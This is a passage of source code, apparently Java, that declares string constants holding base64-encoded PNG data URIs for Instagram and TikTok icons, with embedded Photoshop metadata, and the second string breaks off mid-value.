  String instagramIconBase64 = "data:image/png;base64,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Uk0AAHomAACAhAAA+gAAAIDoAAB1MAAA6mAAADqYAAAXcJy6UTwAAAAJcEhZcwAABCcAAAQnAdlPHYAAAATuaVRYdFhNTDpjb20uYWRvYmUueG1wAAAAAAA8P3hwYWNrZXQgYmVnaW49Iu+7vyIgaWQ9Ilc1TTBNcENlaGlIenJlU3pOVGN6a2M5ZCI/PiA8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIiB4OnhtcHRrPSJBZG9iZSBYTVAgQ29yZSA5LjEtYzAwMSA3OS4xNDYyODk5LCAyMDIzLzA2LzI1LTIwOjAxOjU1ICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIgeG1sbnM6cGhvdG9zaG9wPSJodHRwOi8vbnMuYWRvYmUuY29tL3Bob3Rvc2hvcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RFdnQ9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZUV2ZW50IyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgMjQuNyAoV2luZG93cykiIHhtcDpDcmVhdGVEYXRlPSIyMDIzLTEyLTE5VDE1OjU4OjE4LTAzOjAwIiB4bXA6TW9kaWZ5RGF0ZT0iMjAyMy0xMi0yNlQxNDoxOToyNy0wMzowMCIgeG1wOk1ldGFkYXRhRGF0ZT0iMjAyMy0xMi0yNlQxNDoxOToyNy0wMzowMCIgZGM6Zm9ybWF0PSJpbWFnZS9wbmciIHBob3Rvc2hvcDpDb2xvck1vZGU9IjMiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MzNkZWE0OTktNDkyOC02ZjRiLWEwMjYtODI0MWU0ODUwYTM1IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjMzZGVhNDk5LTQ5MjgtNmY0Yi1hMDI2LTgyNDFlNDg1MGEzNSIgeG1wTU06T3JpZ2luYWxEb2N1bWVudElEPSJ4bXAuZGlkOjMzZGVhNDk5LTQ5MjgtNmY0Yi1hMDI2LTgyNDFlNDg1MGEzNSI+IDx4bXBNTTpIaXN0b3J5PiA8cmRmOlNlcT4gPHJkZjpsaSBzdEV2dDphY3Rpb249ImNyZWF0ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6MzNkZWE0OTktNDkyOC02ZjRiLWEwMjYtODI0MWU0ODUwYTM1IiBzdEV2dDp3aGVuPSIyMDIzLTEyLTE5VDE1OjU4OjE4LTAzOjAwIiBzdEV2dDpzb2Z0d2FyZUFnZW50PSJBZG9iZSBQaG90b3Nob3AgMjQuNyAoV2luZG93cykiLz4gPC9yZGY6U2VxPiA8L3htcE1NOkhpc3Rvcnk+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+pI09awAAExNJREFUaIG9WmtsHNd1/ua1Ozs7sw/ug7ukSK5I8SWTIkW9LUMC0yCKq8hCFCSWKscp4iRt0AIpnEebxkmsyCkCJGjR/mkSJzFix4qRpElUVY4Z2JItWY4oybIpiqKopSm+RO6Kq31wZ3d23v1BzniWZBy3KHoBAtyZO2fOOfc7537n3CGOHTsGa8iyjObmZtA0jUqlAkVRoGlaZMuWLRunp6d31NXVfTgQCDTwPM9xHOdyu92U2+0mKIoiOI4DQRB4v8OSL8uyoSiKXiqVVFEUy4VCYT6VSr3S2tp69vLly1Nut3tSEARks1mk02kwDANVVW059ErBBEFA0zQsLCwE+/r6/jYUCh3duHFj+549e963cu9nsCwLlmXXutUC4AFJkr5JEES6XC4/Nzw8/LRpmrdM01w1merv77cVV1UVDMMgHA4/unv37p/t3r37Y+vWrQu73e7/U+Xfz2AYBnV1dXxTU9P9tbW1D2cyGWp2dvYCwzBV82jTNG3lFUVBIBA4/uCDDz7B8/yffImmaTBNE4Zh2NcMw4BhGKvgZL2Hoij7N0mSAACXy/We72lsbIzGYrHv8Dzf8sYbb3zO5XLZcmiapmEYBkiSRFdX19cPHz78xFoel2UZt27dEkul0tVSqXRzy5Yt8x6Px8zlcqYkSQZBECAIAuVy2VQUxVjLAIqiCJ7nSctQlmXJmpoaIpvN4urVq2Gv19vCsmzfhg0bagVBqHre5XLhwIEDnwXgOn/+/F9aMUfTNA1JkhCPxz/68MMPf2ul8qIommfOnPkNgH+rVCqp0dHR2/Pz80pTUxM2bNgAkiRBURQsAyyH/BEDbM9Z81mWxcLCAl544QXU1taisbGxaXh4uMHlcn18z549n6urq6sKlI985COfKhQK4xMTE095vV6Quq5DVdXAnj17vuvxeKpeOj4+nnnmmWcevH79+scKhcJroVBoLBAIKKFQCCuxaA2CIOD1esFxHNxuN9xuNzweD7xeb5VRhmHA6/UCAObn5xEKhRCLxdDe3j7Fsuzrw8PDX3j22We3vfnmm8Mr5e/bt++rLMt2kCQJ+t69e+jp6Xmsvb29xTlxcnLy3k9/+tM9NE2PRqNRuN3uKqxbgyRJuN1u2/vlchlvvfUWGIaxs4yiKFAUBW1tbfB4PNA0DX6/H9PT0xgdHcXQ0BAIgoAgCLjvvvvQ0tKC6elpmKZ5fWho6AFN0y7s2LGjy3pnJBLhenp6vnjx4sXP0oFAINjV1fWIFVAAUC6X8dvf/vZwpVIZjcVi9rI74eDxeKDrOkzTxMWLFyHLMgzDQCKRwI0bN8AwDGpqagAAi4uLkGUZiUQCr776Knw+HxYXFzE2NoZ0Oo1IJALTNMEwzOO6rj+k6zq8Xu+/5nK53+Tz+cWXXnppfzQavbZ+/Xq/pUNnZ+cnBwcHn6IFQVjf3Nzc61RwcHBwIJ1Ov8zzPAzDgCRJCAQC9n2WZTEyMoL5+Xm43W4kk0n4/X4Ui0XU19dDEAR7ZQDA4/HYmWZmZgaRSATpdBoejwcdHR0ol8u47777nti3b99xjuNgmiaOHDmy98SJE0dSqdQL2Wx2+uLFi/+yfv36Jy0dGhsb3fX19T1kJBLpdiqn6zpu3br1z8BS5Kuqirm5OZAkaeOeJEmcPn0ac3Nz0DQNDMPA4/HA4/GAJEmoqgpN06DrOnRdh6Zp9u7p8XjAMAy8Xi/q6+tRW1uLQCDQ0tXV9XUrTkiSRCAQwN69ex8vlUpob2+HaZq/SqVSVUiIxWIfpYPB4L4V2FcZhpnu6uqyg07XdbAsi7GxMeTzeRtCDMOAJEmQJAld11EsFqGqqsBxXIyiqA+wLLtu+fkFTdPOaZo2IYriIs/z4DgOoijC5/MhFArxrjU2A5/P515Ot0in09NTU1Nvx2IxGy2hUGgHLQjCBudD2Ww2mc/nU6FQCNbWTZIkUqkUUqkUdF0HTdPQdR3AUlbI5/Pw+/2bWltbj8Tj8U/v2rVLIAjCYzlgWY48Pz9faWlp+ZWiKE/fvXt3EIDFb0Z9Pt/vE4nEh1ZA+TWe5zE5OYlUKlXs7u5+FYBtQDgcrqE5jvM7H9I0LZnL5fLOayRJolwuwzAM0PS79Mk0TRSLRU9HR8fx3bt3f7GxsXGlE53D3dTU5G5qanoslUo9NjIy8tzly5f/URTF2UAgoExOTv7NpUuXvh+NRv8MAEZGRn5048aNrzAMg87OTnAch0gkktF13U4qgUDARXtWJH9d1zOyLENRFNvDhmFA0zR76zdNE4qiQBTF1r179/5y8+bNPe+l+coRi8UQi8U+GY1G+wcGBv4ilUqdD4fD40NDQ/saGhp2mKapX7p0adBStLOzE83NzUilUqYsy+A4DgDA8zxJMwxTxUgNwyhYAWgpa/EYCxIEQYDjuMb9+/ef3rx5c+taSmYyGWiaBgAGRVFkJBJZNae7u3ud3+//zxMnTnz45s2bg3V1dXokEnmjUqlAEATcvXsXvb29YFkW4+PjUFXVqK2tfXdJ3W7Qbre7ygBZlsV8Pg+apu1gZVnW9v7yaggPPfTQf62l/M2bN3N37tx5WpKkd6ampqZM09Tj8XiDx+NZV1dX96ne3t6qDbOxsTFw6NChU88///zOUqk0MTY2BkEQQBAEAoEAYrEYSqUSZFmGqqq6czMlCAI0wzD2DmYYBrq6uvTHH38cNE3D4/FgYGAAs7OzsJAmiiK6urq+vHnz5m6nIpqm4Xe/+90Pr1+//l2apse3b98OK6f7fD5cuXIFFy5ceHp0dPTz+/fv/4bP57OfbWtri+zdu/d7586dO3T79m1wHIdKpYJIJIKamhosLi6CIAgoiqKuZAMkSZI2QTFNE8FgkOjq6kJHRweamprAMAwKhQIkSUKhUADLson+/v5/cApRVRW/+MUvvn327Nm/4jhuvKamBs7iY1kuGIZJzc3NffPs2bOP5fP5KkW2bdv20Wg0utvlcoEkSbAsC4toWpTdMIxVFQ3p/GGaJmRZRqFQQKFQgK7rEAQBsVgMkUgEgiCgra3taDwer2JyL7/88rNXrlx5wufzgWEYrFU5maZpc6MbN2785NSpU9+04gwABEFAc3Pzl0RRJCRJQrlcthNJtZhq2VUrAMDmN8BSDVAul6GqKiqVCiiKoltbWz/jnD87Oytevnz5ax6PBxRFrUn4rEEQBBYWFpDJZHD16tVvjY6OXnPe37Rp04coiuKLxSJEUVzp/bXJ5B8rxH0+H/7whz/g7bffhqZpyOfz0HU92NraGnPOGx4efv7u3buzDMNA0zTMzs6iXC5XVV4URcE0TXi9XsTjcTQ0NCAWi2FqaurEcqYCANTW1nLhcHiP3+9HMBiE1+uFYRh2JlxrZek1Cg/T+QDP8wgEAtA0DV6vdxvHcXbFI0kSRFEc7u3thcvlgmmaUFUVPp8PlUrFptiiKIKmaQiCAJZlbUXS6fTNe/fuwUqNhmEgHA4/4PV6TwMAx3FwwgzAqiVY1ZWwFNd1HW63Gz6fD16vF5qmgeO4ZsMwbIsXFxeh63pu3bp19vISBAFd17G4uAiGYVCpVDAzMwOKopDNZqtgUCqV3tE0rQDAZgM8z0domgZJknZ1Zxm8FoSqDHB63qnQ/3Y4l9zaCJ3y3o/sldBZCaMqA5apLGFRZysjWb0iABMkSZoACGApTiiKCs7Ozq6CUDAYxOLiImiaRkNDA9LpNAKBAFiWtWvmXC7XTNN0FRcTRXFBkiQASxASBMF2JkmSq4ymV1rk9BRBEBBFEcBSdlJV9XK5XJZ9Ph8LLHF7nue7X3vtNYTDYTsNx+NxxONxmKYJTdPA8zzu3LmDTCZjZ7lKpYLu7u6NoVDIfjdJkshkMq+LogjDMFBTU4N4PO6ETlXaBwByrcgGlvC9a9cu9Pb2gqZpBAIBUBSVSyaTVVVFd3f30Wg0uk5VVdA0jfr6+qrgs2KCIAiUSiXMz89jZmYG6XQaTU1NR5zsNp1OlzOZzLlCoYBcLodSqWR7fSX8bAOcu5vVeLImut1ucBxnF+i6rmvJZPJHTgHr1q3jt23b9m1JkqDrOpy19cphmiYikQjC4TD6+vq+0dnZucl5/9q1a7/XdV0UBAE8z9vNAqtoWgtCq97mdrvh9/vh9/tBURSKxSJSqRQWFhZQLBZx69at5+fn51XnMx/84Acf3bp161OLi4tQVXVNTy1zGZimiY0bN376wIEDx5zNgmKxiImJie/xPG96vV5YVdsKhKwSTDr35uXAMq9fv46bN29iamoKqqrC7/fD4/HA7/ejUqlMnj179jtOIQzD4BOf+MTX+vv7f1Aul1uy2WzVSpAkiVwuB0VRauvq6o719/f/2FmHA8ClS5d+vbCwcMHqPlMUhaamJvv55b9VBtCKorwbISSJ69evUz//+c/toLTotOVVnucxPj7+3atXrx7s6+uzIUDTNA4cOPC51tbWj9+5c+eHhUJholwu3wag5/P5xp6enoa6urpHe3t7N6xUYmxsbOH8+fNfcrlcqFQqMAwDFEXZdbcjpdMrIUorilK11bEsywWDQfj9fntVDMOo2hEJgiieOnXqAEEQL6+sCTo6OoIdHR1/n8lksG3bNhOAQZIkFY1GV+oNAJiens6fPHnygKIotwmCsDdRr9frjD3LwZTTAE3TQCuKUoVngiACa/UwnSWmaZool8vTp0+f3m+a5i/7+vpWlZThcBhYwiy18p41hoeHZwYGBo4WCoVBi6kSBAFJknDw4EG0t7ejVCoBACiKQqFQqKI+siyDrlQqslMoSZJRt9td1fskSdLO8VaWcrlc4Hk++dZbb+0aGxs7tnv37i81Nja+r207lUphuaj/qiiKdyyqAixlKpfLhdu3b1txA2DpRKelpQWJRMKWUywWdbpUKhWcwhmGaQ4Gg/5QKFRwtlVUVUU6nbaNsLwlCII0MjLyFUmSfiYIwpFNmzZ9OpFIrNVWUebn56U333zzV6qqPp1OpwcDgQAqlYr9buvMwO124+rVq1AUxU4GCwsLOHr0aMiZufL5fIUWRXEcwBbrYjAYbPX5fHGSJAsWfDRNQ01NDViWxe3bt6tIlWmaCAQCME3zWjKZvBaJRP7plVdeidM0/QGfz9dAEAQpiuJdTdNe3bJlyzsTExOL8XgcwWAQoiiCJEnIsoxKpYJgMIhQKARVVRGJRGzmShAE7t696/X5fFXnXNls9h6dzWZfAvCwdTGRSLhVVa1PJpM3rbq1UCigp6cHgUAAHo8HlUoFhUIBpVLJbh2SJAlBEMAwTLFcLhdpmr7lcrmsQ4+lgKNp8DwPiqKgqioMw0A2m0VbWxuCwSCSySRcLhf6+vowNzeH2dlZu4kWjUabGhoatjgNyGQyb5CZTGa4UHgXRTRNo7W19QvAUpRTFGV3jy0eI0kS9u/fj0ceeQThcNhudlkpUNf1qkLEumZxIAA2+evv78ejjz6KtrY2u/tgtWBu3bqFZDKJkZERuFyuj9XV1a2MpZN0qVSamJiYGHI2p3bu3HlgaGjogXQ6/TrLslh5aqNpGhKJBBobG6HrOhoaGrCwsGAHd21tLQiCAM/zVac2JEkiEomgvr7edkokEgHP81hcXLSpgqIoMAwDPM/D6/VCluWGnTt3ftGpw+TkZGlubu46nclkcsPDw8/19PT0WAHD8zwOHjz4H88888yucrk8sdIACxalUslOs9FoFPX19VBVFdu3b4csVyU3MAwDiqKwY8cOu2vNcVxVenYOVVXh8XhQU1PDdXV1nXSeDQDAjRs3niUIYoYMhUIYGxv78djY2DvOCRs2bIgePXr0gt/v35PL5SDL8ppEzQkR65BDURS7xW611i0epCiKDSdnA2Glg5YbCp2bN28+d//9929eAZ3FoaGh7wmCsHTIxzBM/ty5c19OJBK/drZKN27cGIvH42fOnDnznK7rP8lkMjO5XG4yk8lAVdX3ZJ7/0yFJEjKZDEKhULxYLK5PJBIHtm7d+nft7e1Vh3y6rmNgYOApWZYnaJoGcfz4cduLiUTi64cPH151UgksdeSSyeRdSZIGJUm60draKnEcZ+bzeb1cLptWugMAWZZ1RVF0YvmCaZqgaZrweDw2+V/mWQTLsmQkEiFTqRQ9MTHRGgwGt9fV1a2PxWKrdACAkydP/vjChQufsY5ZiSeffNLO9ZIkobu7+/ihQ4fe10G3lVGsjGMZ4CzErWHxeqcBTo7/pw67ZVnGiy+++IPBwcG/dvZq7U8NrKYURVFn0+n0hK7r3dFotOa9Cm+aprEMQbhcLjAMY/9vHbFaf877zvk0Ta86RFw5Jicn5wcGBo5dvnz5a9Y+YjnINgBYwlcsFoMsy9euXLnys1KpVM5ms/U+ny/0//29hCRJuHbtWjqZTP7766+//vlKpfKioiirWpdr9oVomkYkEsmNj49/a2xs7PuVSqVzZmZmaywW+/NgMNggCILX+bkNSZIEwzCr9os/Nqxz4+WMZSiKYix/blPK5/Op5c9tzly5cmWKpunJcDiMfD6/ZqX339iqq5SxeNcPAAAAAElFTkSuQmCC";
  String tiktokIconBase64 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAQnAAAEJwHZTx2AAAAE7mlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgOS4xLWMwMDEgNzkuMTQ2Mjg5OSwgMjAyMy8wNi8yNS0yMDowMTo1NSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOnBob3Rvc2hvcD0iaHR0cDovL25zLmFkb2JlLmNvbS9waG90b3Nob3AvMS4wLyIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0RXZ0PSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VFdmVudCMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDI0LjcgKFdpbmRvd3MpIiB4bXA6Q3JlYXRlRGF0ZT0iMjAyMy0xMi0xOVQxNTo1OTowMy0wMzowMCIgeG1wOk1vZGlmeURhdGU9IjIwMjMtMTItMjZUMTQ6MTk6NDItMDM6MDAiIHhtcDpNZXRhZGF0YURhdGU9IjIwMjMtMTItMjZUMTQ6MTk6NDItMDM6MDAiIGRjOmZvcm1hdD0iaW1hZ2UvcG5nIiBwaG90b3Nob3A6Q29sb3JNb2RlPSIzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOmJkZThjMGM4LTM4OWMtYzk0OS05MjRhLWI2YWY2MmRiYmE5ZCIgeG1wTU06RG9jdW1lbnRJRD0i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